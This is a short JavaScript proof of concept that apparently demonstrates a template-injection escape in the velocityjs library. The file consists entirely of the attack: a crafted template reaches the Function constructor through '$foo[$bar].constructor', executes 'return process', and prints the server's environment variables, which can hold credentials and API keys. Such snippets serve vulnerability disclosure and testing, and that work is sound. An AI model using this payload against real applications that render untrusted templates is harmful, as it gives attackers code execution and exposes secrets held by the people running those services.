const velocityjs = require('velocityjs');
const context = {
    foo: {},
    bar: "constructor"
};

const template = velocityjs.parse('$foo[$bar].constructor("return process")().env');
const comp = new velocityjs.Compile(template);
console.log(comp.render(context));
